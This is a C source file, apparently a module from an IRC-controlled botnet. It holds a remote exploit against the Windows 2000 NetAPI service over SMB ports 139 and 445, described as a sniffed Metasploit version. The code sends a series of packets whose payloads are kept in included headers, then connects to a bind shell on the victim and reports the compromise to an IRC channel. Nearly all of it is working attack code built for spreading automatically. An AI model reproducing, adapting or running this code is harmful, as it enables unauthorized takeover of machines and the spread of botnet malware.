#include "includes.h"
#include "functions.h"
#include "externs.h"
#include "win2k445.h"
#include "win2k139.h"
/*

  sniffed metasploit version [ windows 2000 only (for now) ]


*/
#ifndef NO_NETAPI2
BOOL netapi2(char *target, void* conn,EXINFO exinfo)
{
	IRC* irc=(IRC*)conn;
	irc->privmsg(target,"Starting on %s", exinfo.ip);
	int recv_bytes = 0, action = 0;
	unsigned int i = 0;

	WSADATA wsaData;
	struct hostent *target_ptr;
	struct sockaddr_in sock;
	SOCKET thesocket;

	if (WSAStartup(MAKEWORD(2, 2), &wsaData) < 0)
	{
		WSACleanup();
		printf("[-] Outdated Winsock Version\r\n");
		return 0;
	}

	if ((thesocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
	{
		printf("[-] Error Creating Socket\r\n");
		closesocket(thesocket);
		WSACleanup();
	}

	if ((target_ptr = gethostbyname(exinfo.ip)) == NULL)
	{
		printf("[-] Resolve of %s failed\n", target);
		closesocket(thesocket);
		WSACleanup();
		return 0;
	}

	memcpy(&sock.sin_addr.s_addr, target_ptr->h_addr, target_ptr->h_length);
	sock.sin_family = AF_INET;
	sock.sin_port = htons(exinfo.port);

	if ((connect(thesocket, (struct sockaddr *)&sock, sizeof(sock))))
	{
		printf("[-] Could Not Connect\r\n");
		closesocket(thesocket);
		WSACleanup();
		return 0;
	}


	if (exinfo.port == 139)
	{
		printf("[+] Exploiting port 139\r\n");
		send(thesocket,win2k139_0,sizeof(win2k139_0)-1,0); 
		Sleep(100);
		send(thesocket,win2k139_1,sizeof(win2k139_1)-1,0); 
		Sleep(100);
		send(thesocket,win2k139_2,sizeof(win2k139_2)-1,0); 
		Sleep(100);
		send(thesocket,win2k139_3,sizeof(win2k139_3)-1,0); 
		Sleep(100);
		send(thesocket,win2k139_4,sizeof(win2k139_4)-1,0); 
		Sleep(100);
		send(thesocket,win2k139_5,sizeof(win2k139_5)-1,0); 
		Sleep(100);
		send(thesocket,win2k139_6,sizeof(win2k139_6)-1,0); 
		Sleep(100);
		send(thesocket,win2k139_7,sizeof(win2k139_7)-1,0); 
		Sleep(100);
	    send(thesocket,win2k139_8,sizeof(win2k139_8)-1,0); 
		Sleep(100);
		send(thesocket,win2k139_9,sizeof(win2k139_9)-1,0); 
		Sleep(100);
		send(thesocket,win2k139_10,sizeof(win2k139_10)-1,0); 
		Sleep(100);
		send(thesocket,win2k139_11,sizeof(win2k139_11)-1,0); 
		Sleep(100);
		send(thesocket,win2k139_12,sizeof(win2k139_12)-1,0);
		Sleep(100);
		send(thesocket,win2k139_13,sizeof(win2k139_13)-1,0);
		Sleep(100);
		//printf("[+] Exploit Sent, check for shell on %s:6236\r\n", target);
		//return 0;
	}

	if (exinfo.port == 445)
	{
		printf("[+] Exploiting port 445");
		send(thesocket,win2k445_0,sizeof(win2k445_0)-1,0); 
		Sleep(100);
		send(thesocket,win2k445_1,sizeof(win2k445_1)-1,0); 
		Sleep(100);
		send(thesocket,win2k445_2,sizeof(win2k445_2)-1,0); 
		Sleep(100);
		send(thesocket,win2k445_3,sizeof(win2k445_3)-1,0); 
		Sleep(100);
		send(thesocket,win2k445_4,sizeof(win2k445_4)-1,0); 
		Sleep(100);
		send(thesocket,win2k445_5,sizeof(win2k445_5)-1,0); 
		Sleep(100);
		send(thesocket,win2k445_6,sizeof(win2k445_6)-1,0); 
		Sleep(100);
		send(thesocket,win2k445_7,sizeof(win2k445_7)-1,0); 
		Sleep(100);
		send(thesocket,win2k445_8,sizeof(win2k445_8)-1,0); 
		Sleep(100);
		send(thesocket,win2k445_9,sizeof(win2k445_9)-1,0); 
		Sleep(100);
		send(thesocket,win2k445_10,sizeof(win2k445_10)-1,0); 
		Sleep(100);
		send(thesocket,win2k445_11,sizeof(win2k445_11)-1,0); 
		Sleep(100);
		send(thesocket,win2k445_12,sizeof(win2k445_12)-1,0); 
		Sleep(100);
		//printf("[+] Exploit Sent, Check for shell on %s:6236\r\n", target);
	}
	closesocket(thesocket);
	WSACleanup();

	if (ConnectShell(exinfo,bindport)) {
		irc->privmsg(target,"%s %s: Exploiting IP: %s", scan_title, exploit[exinfo.exploit].name, exinfo.ip);
		exploit[exinfo.exploit].stats++;
		return true;
	}
return false;
}
#endif